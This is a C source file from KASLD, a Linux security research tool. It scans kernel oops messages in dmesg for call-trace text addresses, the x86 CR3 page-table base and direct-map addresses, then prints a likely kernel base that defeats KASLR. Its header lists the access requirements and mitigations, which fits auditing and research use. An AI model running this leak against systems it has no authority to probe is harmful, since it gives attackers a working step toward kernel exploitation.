// This file is part of KASLD - https://github.com/bcoles/kasld
//
// Search kernel log for kernel oops messages and extract:
//
// 1. Kernel text addresses from [<addr>] call trace tokens.
// 2. Physical DRAM address from CR3 page table base register (x86).
// 3. Directmap virtual addresses from register dump values that fall
//    in the PAGE_OFFSET..KERNEL_BASE_MIN range.
//
// Oops messages contain structured register dumps whose format varies
// by architecture:
//
//   x86_64:  RAX/RBX/..., CR3 (physical page table base)
//   x86_32:  eax/ebx/..., CR3
//   arm64:   x0..x29
//   riscv64: gp/tp/t0..a7/s0..s11
//
// Individual register values are unpredictable across different oopses,
// but any value landing in a known kernel address range is useful.
//
// Leak primitive:
//   Data leaked:      kernel text addresses, physical page table base (CR3),
//                     directmap virtual addresses from register dumps
//   Kernel subsystem: arch/*/kernel — kernel oops handler (show_regs)
//   Data structure:   struct pt_regs (register dump), call trace addresses
//   Address type:     virtual (kernel text) + physical (CR3 on x86)
//   Method:           parsed (dmesg oops output)
//   Status:           unfixed (oops output is essential for debugging)
//
// Mitigations:
//   Access gated by dmesg_restrict (see dmesg.h for shared access gate
//   details). Oops output cannot be suppressed without CONFIG_PANIC_ON_OOPS.
//   %pK/%pS sanitization does not apply to oops register dumps.
//
// Requires:
// - kernel.dmesg_restrict = 0; or CAP_SYSLOG capabilities; or
//   readable /var/log/dmesg.
// - kernel.panic_on_oops = 0 (Default on most systems).
// ---
// <bcoles@gmail.com>

#define _GNU_SOURCE
#include "include/dmesg.h"
#include "include/kasld.h"
#include "include/kasld_internal.h"
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

KASLD_EXPLAIN(
    "Extracts kernel addresses from oops/panic call traces in dmesg. "
    "Bracketed addresses [<ffffffff...>] are kernel text pointers; "
    "x86 CR3 values reveal the physical page table base; register "
    "dumps may contain direct-map virtual addresses. Any kernel crash "
    "or warning logged to dmesg can expose multiple address types. "
    "Access is gated by dmesg_restrict.");

KASLD_META("method:parsed\n"
           "addr:virtual\n"
           "sysctl:dmesg_restrict>=1\n"
           "bypass:CAP_SYSLOG\n"
           "fallback:/var/log/dmesg\n");

struct oops_ctx {
  unsigned long text;
  unsigned long directmap;
  unsigned long phys;
};

/* Check if an address falls in the directmap region:
 * above PAGE_OFFSET but below both text and module regions.
 *
 * On arches where directmap overlaps text (arm32, x86_32), this
 * returns 0 for all values because PAGE_OFFSET >= KERNEL_BASE_MIN. */
static int in_directmap_range(unsigned long val) {
  if (val < PAGE_OFFSET)
    return 0;
  if (val >= KERNEL_BASE_MIN)
    return 0;
#if MODULES_START >= PAGE_OFFSET
  if (val >= MODULES_START && val <= MODULES_END)
    return 0;
#endif
  return 1;
}

/* Scan [<addr>] tokens in call trace lines for kernel text addresses. */
static int on_calltrace(const char *line, void *ctx) {
  struct oops_ctx *c = ctx;
  const char *ptr = line;
  char *endptr;

  while ((ptr = strstr(ptr, "[<")) != NULL) {
    ptr += 2;
    unsigned long addr = strtoul(ptr, &endptr, 16);

    if (!addr)
      continue;

    if (addr >= KERNEL_BASE_MIN && addr <= KERNEL_BASE_MAX) {
      if (!c->text || addr < c->text)
        c->text = addr;
    }
  }

  return 1;
}

/* Scan CR3 line for physical page table base address (x86).
 * Format: "CR2: %016lx CR3: %016lx CR4: %016lx" */
static int on_cr3(const char *line, void *ctx) {
  struct oops_ctx *c = ctx;
  const char *p = strstr(line, "CR3:");
  if (!p)
    return 1;

  p += 4;
  while (*p == ' ')
    p++;

  char *endptr;
  unsigned long addr = strtoul(p, &endptr, 16);
  if (endptr == p || !addr)
    return 1;

  /* CR3 may include PCID/ASID bits in the low 12 bits; mask to page */
  addr &= ~(PAGE_SIZE - 1);

  if (!c->phys || addr < c->phys)
    c->phys = addr;

  return 1;
}

/* Scan register dump lines for hex values in the directmap range.
 * Handles all architectures: extracts values after ": " delimiters. */
static int on_regdump(const char *line, void *ctx) {
  struct oops_ctx *c = ctx;
  const char *p = line;

  while ((p = strstr(p, ": ")) != NULL) {
    p += 2;

    char *endptr;
    unsigned long val = strtoul(p, &endptr, 16);
    if (endptr == p)
      continue;

    p = endptr;

    if (val && in_directmap_range(val)) {
      if (!c->directmap || val < c->directmap)
        c->directmap = val;
    }
  }

  return 1;
}

/* Architecture-specific needles for register dump lines.
 * Each matches the first register name on a dump line so
 * the callback can extract all values from that line. */
#if defined(__x86_64__)
static const char *reg_needles[] = {
    "RAX:", "RDX:", "RBP:", "R10:", "R13:", NULL};
#elif defined(__i386__)
static const char *reg_needles[] = {"eax:", "esi:", NULL};
#elif defined(__aarch64__)
static const char *reg_needles[] = {
    "x0 :", "x4 :", "x8 :", "x12:", "x16:", "x20:", "x24:", "x28:", NULL};
#elif defined(__riscv) && __riscv_xlen == 64
static const char *reg_needles[] = {
    " gp :", " s1 :", " a2 :", " s2 :", " s5 :", " s8 :", " s11:", NULL};
#else
static const char *reg_needles[] = {NULL};
#endif

int main(void) {
  struct oops_ctx ctx = {0, 0, 0};

  printf("[.] searching dmesg for kernel oops information ...\n");

  int ds = dmesg_search("[<", on_calltrace, &ctx);
  if (ds < 0)
    return KASLD_EXIT_NOPERM;

  dmesg_search("CR3:", on_cr3, &ctx);

  for (int i = 0; reg_needles[i]; i++)
    dmesg_search(reg_needles[i], on_regdump, &ctx);

  if (!ctx.text && !ctx.directmap && !ctx.phys) {
    printf("[-] no kernel oops information found in dmesg\n");
    return 0;
  }

  if (ctx.text) {
    printf("lowest leaked text address: %lx\n", ctx.text);
    printf("possible kernel base: %lx\n", ctx.text & -KERNEL_ALIGN);
    kasld_result(KASLD_ADDR_VIRT, KASLD_SECTION_TEXT, ctx.text,
                 "dmesg_backtrace:text");
  }

  if (ctx.phys) {
    printf("leaked physical address (CR3): %lx\n", ctx.phys);
    kasld_result(KASLD_ADDR_PHYS, KASLD_SECTION_DRAM, ctx.phys,
                 "dmesg_backtrace:cr3");
#if !PHYS_VIRT_DECOUPLED
    unsigned long virt = phys_to_virt(ctx.phys);
    printf("possible direct-map virtual address: %lx\n", virt);
    kasld_result(KASLD_ADDR_VIRT, KASLD_SECTION_DIRECTMAP, virt,
                 "dmesg_backtrace:cr3:directmap");
#endif
  }

  if (ctx.directmap) {
    printf("leaked directmap virtual address: %lx\n", ctx.directmap);
    kasld_result(KASLD_ADDR_VIRT, KASLD_SECTION_DIRECTMAP, ctx.directmap,
                 "dmesg_backtrace:directmap");
  }

  return 0;
}
